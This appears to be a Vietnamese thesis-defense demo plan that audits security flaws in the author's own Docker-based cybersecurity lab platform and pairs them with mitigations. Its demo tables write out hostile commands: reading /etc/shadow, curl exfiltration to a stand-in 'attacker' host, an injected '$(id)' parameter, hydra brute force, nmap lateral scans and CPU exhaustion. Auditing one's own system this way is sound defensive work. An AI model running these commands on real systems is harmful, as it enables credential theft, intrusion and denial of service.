# Demo Plan cho các Risk — Kiến trúc triển khai thực tế

## Môi trường triển khai
- **Manager node** (192.168.187.99 hoặc 127.0.0.1:5000): Flask app + Nginx reverse proxy
- **Worker A** (192.168.187.99): Chạy container lab có `lab_id` chẵn
- **Worker B** (192.168.187.98): Chạy container lab có `lab_id` lẻ
- **Docker Hub**: Images pre-built (`hoangnth101100/smb-client:latest`, ...)
- **`labs/` folder**: Chỉ lưu trên manager node tại `/home/hoangnth/labtainer/labs/`
- **Student**: Chỉ truy cập qua browser (lab_terminal.html + TTYD web)

---

## Flow xử lý terminal (Attack Surface chính)

```
┌─ Browser ─────────────────────────────────────────────────────┐
│  lab_terminal.html (xterm.js + Socket.IO)                     │
│  URL: /lab/<id>/<session>/terminal?flow_type=CUSTOM           │
└──────────────────────────┬───────────────────────────────────┘
                           │ Socket.IO 'terminal_input'
                           ▼
┌─ Manager Node (Flask) ────────────────────────────────────────┐
│  handle_terminal_input() [line 4048]                          │
│    ├─ Windows → handle_windows_terminal_input()               │
│    │    └─ execute_secure_command() → validate_command_access()│
│    └─ Linux  → os.write(pty_fd, ...) [line 4073] ← NO CHECK  │
│                                                               │
│  PTY child: sudo -u student_xxx /bin/bash -c                  │
│    "sudo docker_client_shell_{containerName}"                 │
│                                                               │
│  docker_client_shell script:                                  │
│    ssh -t -i /home/hoangnth/labtainer/labs/lab-ssh-key        │
│        student@<worker_ip> "docker exec -it <container> bash" │
└──────────────────────────┬───────────────────────────────────┘
                           │ SSH → docker exec
                           ▼
┌─ Worker Node Container ───────────────────────────────────────┐
│  BASH — unrestricted (root or admin)                          │
│  TTYD also running inside → nginx proxy at /vul-lab-*/web/*  │
└───────────────────────────────────────────────────────────────┘
```

---

## Risk 1: Unvalidated bash qua Flask PTY (CR-1)

### Mô tả
`validate_command_access()` chỉ được gọi từ `handle_windows_terminal_input()` (Windows path).  
Trên Linux (path chính): `os.write(pty_fd, input_data)` tại line 4073 ghi trực tiếp vào PTY — **không có validation nào**.

### Evidence trong code
- `lab_management_app.py:830` — `def validate_command_access()` tồn tại
- `lab_management_app.py:4184` — chỉ được gọi từ `execute_secure_command()` → Windows path
- `lab_management_app.py:4073` — Linux path không gọi validate

### Demo (2 phút, từ browser student)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | Login, start lab CUSTOM | Mở terminal trong browser |
| 2 | `whoami` | `root` hoặc `admin` — không bị chặn |
| 3 | `cat /etc/shadow` | Nội dung file shadow — không bị chặn |
| 4 | `apt-get update && apt-get install -y netcat-openbsd` | Cài đặt thành công |
| 5 | Chụp UI: dòng "Security Mode: Commands are validated" | Mâu thuẫn với kết quả |

### Kiến trúc
- Manager node chạy Flask code → PTY fork → SSH → worker node → docker exec
- Student không cần biết đường hầm SSH — chỉ cần gõ lệnh trên browser

---

## Risk 2: TTYD truy cập trực tiếp không auth (CR-2)

### Mô tả
Nginx proxy location cho TTYD (`/vul-lab-{a,b,c}/<id>/web/<port>/`) không có `auth_basic` hay `auth_request`. Bất kỳ ai biết URL đều có bash shell trong container.

### Evidence
- `nginx/labtainer.local.com.conf:306-407` — không có auth directive nào
- 3 client containers có TTYD: smb-enum-lab, ftp-ssh-lab, bruteforce_ssh

### Demo (2 phút)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | Start lab → lấy URL: `/vul-lab-a/5/web/50001/` | Trả về từ API |
| 2 | Mở URL đó trong **incognito window** (không login) | TTYD terminal hiện ra |
| 3 | `id` | `uid=1000(admin)` — full shell |
| 4 | `curl http://127.0.0.1:5000/admin` | Có thể reach được Flask admin |

### Kiến trúc
- Nginx trên manager node proxy thẳng tới TTYD container trên worker node
- `proxy_pass http://$web_target_host:$web_port/` — không qua Flask
- Port range check bằng regex: `(8\d{3}|9\d{3}|10000|5\d{4}|60000)` — chỉ validate format, không auth

---

## Risk 3: Privileged container escape (CR-3)

### Mô tả
`labs/ftp-ssh-lab/docker-compose.yml` có `privileged: true` trên service `ftp-ssh-server`. Container này có toàn bộ capabilities, truy cập host devices.

### Evidence
- `labs/ftp-ssh-lab/docker-compose.yml:8` — `privileged: true`

### Demo (2 phút — từ TTYD hoặc PTY của container ftp-ssh-server)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | `cat /proc/1/status \| grep CapEff` | `0000003fffffffff` (tất cả capabilities) |
| 2 | `cat /proc/1/status \| grep CapPrm` | `0000003fffffffff` |
| 3 | `fdisk -l` | Danh sách disk host (`/dev/sda1`, ...) |
| 4 | `ip link` | Interface vật lý host |
| 5 | `ls -la /dev/` | sda, sdb, loop devices |

> **Lưu ý**: Không thực hiện mount host filesystem trong demo (nguy hiểm). Chỉ chứng minh khả năng.

### Kiến trúc
- Container deploy qua Docker stack với service constraint `node.labels.labnode == ${TARGET_NODE}`
- `privileged: true` override mọi security mặc định của Docker
- Worker node có thể bị compromise nếu attacker escape

---

## Risk 4: Không có egress filtering (CR-5)

### Mô tả
Không có network policy nào trong docker-compose.yml. Container có thể truy cập internet tự do.

### Evidence
- Không docker-compose.yml nào có `network.policy` hoặc egress rules

### Demo (1 phút — từ bất kỳ container lab CUSTOM nào)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | `ping -c 2 8.8.8.8` | Thành công |
| 2 | `curl -s https://example.com \| head -5` | HTTP response |
| 3 | `nslookup google.com` | DNS resolution |
| 4 | `curl -X POST -d "data=$(cat /etc/hostname)" https://attacker.com/exfil` | Data exfiltration giả lập |

### Kiến trúc
- Container dùng overlay network `lab-network` hoặc custom network
- Docker default bridge cho phép egress ra ngoài
- Không có `network.policy` (Docker Swarm không hỗ trợ native network policies — cần giải pháp third-party)

---

## Risk 5: Không có resource limits (CR-6)

### Mô tả
Không service nào trong docker-compose.yml có `deploy.resources.limits`. Container có thể dùng toàn bộ CPU/RAM host.

### Evidence
- Tất cả docker-compose.yml: không có `deploy.resources.limits`

### Demo (2 phút)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | `apt-get update && apt-get install -y stress` | Cài đặt stress tool |
| 2 | `stress --cpu 4 --timeout 30 &` | Chạy stress |
| 3 | Mở `htop` (hoặc dùng Docker stats) trên manager | CPU 100% trên worker |
| 4 | `docker stats <container_id>` | CPU usage không giới hạn |

### Kiến trúc
- Worker node chạy nhiều container từ nhiều student
- Một student có thể DoS toàn bộ worker bằng resource exhaustion
- Không có cgroups giới hạn → host kernel có thể bị ảnh hưởng

---

## Risk 6: Lateral movement trên overlay network (CR-7)

### Mô tả
Container client có pre-installed attack tools (nmap, hydra, impacket, enum4linux). Các container trong cùng stack chia sẻ overlay network → có thể scan và tấn công lẫn nhau.

### Pre-installed tools theo container

| Container | Tools |
|-----------|-------|
| smb-enum-client | nmap, enum4linux, impacket, smbclient |
| bruteforce-client | hydra, nmap |
| ftp-ssh-client | nmap, netcat, lftp, wget |

### Demo (3 phút)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | `ip addr` | Xem network interface, phát hiện IP overlay |
| 2 | `nmap -sn 10.0.0.0/24` | Scan overlay network → phát hiện container khác |
| 3 | `nmap -sV 10.0.0.2` | Service scan → phát hiện vulnerable services |
| 4 | `smbclient -L //10.0.0.2 -N` | (nếu target là SMB) — anonymous access |
| 5 | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.3` | (nếu target SSH) — brute force |

### Kiến trúc
- Overlay network được tạo bởi docker-compose (`networks: lab-network`)
- Placement constraint đảm bảo tất cả container của 1 lab trên cùng worker
- Nhưng container khác lab có thể cùng overlay? → Cần kiểm tra thêm
- Thực tế: mỗi docker-compose tạo overlay network riêng → chỉ container cùng stack mới reachable

---

## Risk 7: UI tuyên bố sai về security (CR-10)

### Mô tả
`lab_terminal.html:532` hiển thị: *"Security Mode: Commands are validated and restricted to lab resources only."* — nhưng thực tế không có validation nào trên Linux path.

### Demo (1 phút)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | Chụp màn hình banner | "Commands are validated" |
| 2 | Gõ `cat /etc/shadow` | File shadow hiện ra — trái với tuyên bố |

---

## Risk 8: Docker Client Shell Script Injection (CR-11)

### Mô tả
Script `docker_client_shell` được tạo tại runtime từ template có chứa `containerName` lấy từ lab parameter `${dockerExecCommand}`. Nếu parameter chứa injection, script sẽ bị ảnh hưởng.

### Code
```python
# lab_management_app.py:3896-3897
containerName = start_command.replace(STUDENT_ID_LAB_PARAMETER, student_id)
start_command = f'sudo docker_client_shell_{containerName}'
```

```bash
# SCRIPT_TEMPLATE (line 3092-3093)
ssh -t -i /home/hoangnth/labtainer/labs/lab-ssh-key \
    student@${targetIp} "docker exec -it $(docker ps -q -f name=${containerName} | head -n 1) bash"
```

### Demo (Moderate — cần DB access)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | (Giả lập) DB admin sửa `${dockerExecCommand}` thành `lab_{id}_$(id);id` | Script path có injection |
| 2 | Student start lab | Script tạo ra có tên file chứa output của `id` |
| 3 | Kiểm tra `/usr/local/bin/` trên manager | File script với tên bất thường |

---

## Risk 9: Session Hijacking qua Socket.IO (CR-13)

### Mô tả
`active_terminals` dictionary keyed bằng session ID (`request.sid`) — không có xác thực bổ sung trên các socket event. Nếu session ID bị leak, attacker có thể inject lệnh.

### Code
```python
# lab_management_app.py:3712
active_terminals = {}  # {session_id: {...}}

# lab_management_app.py:4067-4073
if terminal_info.get('is_windows', False):
    handle_windows_terminal_input(...)
else:
    pty_fd = terminal_info.get('pty_fd')
    if pty_fd:
        os.write(pty_fd, input_data.encode('utf-8'))  # Không check user
```

### Demo (Hard — cần XSS hoặc MITM)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | Attacker có session ID (qua XSS) | Obtain `request.sid` |
| 2 | Gửi socket event `terminal_input` với session ID đó | Lệnh chạy trong terminal nạn nhân |
| 3 | `os.write(pty_fd, "cat /etc/shadow && curl http://attacker/$(cat /etc/shadow)")` | Data exfiltration |

---

## Risk 10: Flag brute-force / deterministic (CR-14)

### Mô tả
Flag format: `FLAG{SHA1(DDMMYYYY_email_expectedAnswer)}` — deterministic, có thể tính offline nếu biết expectedAnswer và email.

### Evidence
Auto-badge generation code trong `lab_management_app.py` — kiểm tra checkpoint submission so khớp flag pattern.

### Demo (Theory — cần DB access)

| Bước | Thao tác | Kết quả |
|------|----------|---------|
| 1 | Lấy student email và expectedAnswer từ DB | Có đủ input |
| 2 | Tính SHA1(`${DDMMYYYY}_${email}_${expectedAnswer}`) | Trùng khớp với flag |
| 3 | Submit: `FLAG{hash}::random_string` | Hệ thống accept |

---

## Tổng hợp Demo Plan (22 phút cho thesis defense)

| # | Risk | Thời gian | Công cụ | Ghi chú |
|---|------|-----------|---------|---------|
| 1 | **CR-10**: UI tuyên bố sai | 1 phút | Browser + screenshot | Mở đầu — gây attention |
| 2 | **CR-1**: Unvalidated PTY bash | 2 phút | Browser terminal | `cat /etc/shadow` |
| 3 | **CR-2**: TTYD không auth | 2 phút | Incognito browser | Mở URL trực tiếp |
| 4 | **CR-3**: Privileged container | 2 phút | Container shell | `CapEff` check |
| 5 | **CR-5**: No egress | 1 phút | Container shell | `curl google.com` |
| 6 | **CR-6**: No resource limits | 2 phút | Container + htop | `stress` tool |
| 7 | **CR-7**: Lateral movement | 3 phút | Container + nmap | Scan overlay network |
| 8 | **Mitigation**: Fix validation | 2 phút | Code diff | Thêm validate vào Linux path |
| 9 | **Mitigation**: Auth TTYD | 1 phút | Nginx diff | `auth_basic` |
| 10 | **Mitigation**: Resource limits | 1 phút | YAML diff | `deploy.resources.limits` |
| 11 | **Mitigation**: Drop privileged | 1 phút | YAML diff | Remove `privileged: true` |
| 12 | **Mitigation**: cap_drop | 1 phút | YAML diff | `cap_drop: ALL` |
| 13 | **CR-11**: Script injection | 2 phút | Manager shell | (optional, nếu còn time) |
| 14 | **Q&A** | 10 phút | — | — |

### Chuẩn bị trước defense
1. Deploy 1 lab CUSTOM (vd: smb-enum-lab) trên hệ thống thật
2. Chụp screenshot UI + terminal output cho từng bước
3. Chuẩn bị sẵn code diff cho mitigations
4. Kiểm tra `stress` có sẵn trong container không → nếu không thì demo bằng `dd if=/dev/zero of=/dev/null &`
5. Kiểm tra network overlay hoạt động: `docker network ls` trên manager

### Demo fallback (nếu không live được)
- Chuẩn bị slide với screenshot + code evidence cho từng risk
- Screen recording các bước chính (7 demos đầu)
- Code diff cho mitigation đã được review sẵn

---

## Architecture Verification Checklist

### Trên manager node (cần SSH access trước defense)
- [ ] `ls /home/hoangnth/labtainer/labs/` — kiểm tra các lab folder
- [ ] `sudo docker service ls` — danh sách running services
- [ ] `sudo docker node ls` — worker nodes
- [ ] `sudo docker node inspect <node> \| grep -A5 Labels` — placement labels
- [ ] `cat /usr/local/bin/docker_client_shell_*` — script template đã deploy
- [ ] `cat /etc/sudoers.d/student_*` — sudoers rules cho student
- [ ] `ls -la /home/hoangnth/labtainer/labs/lab-ssh-key` — SSH key tồn tại

### Từ browser (student perspective)
- [ ] Mở `/lab/<id>/<session>/terminal` → kiểm tra Socket.IO connect
- [ ] Chụp UI banner "Commands are validated"
- [ ] Chạy `whoami`, `cat /etc/shadow`, `apt-get install nmap` — xác nhận không validate
- [ ] Mở TTYD URL trong incognito — xác nhận không auth
- [ ] Chụp `docker stats` show CPU không giới hạn

### Slide thesis đề xuất
1. **System Architecture** — Sơ đồ 3-node (manager A/B/C)
2. **Terminal Flow** — Browser → Socket.IO → PTY → SSH → docker exec
3. **Attack Surface Map** — 3 terminal paths + container escape
4. **Risk Register (14 risks)** — Bảng summary
5. **Demo 1-7** — Screenshot + giải thích
6. **Mitigations** — Code diff cho từng risk
7. **Validation Checklist** — Đã verify những gì
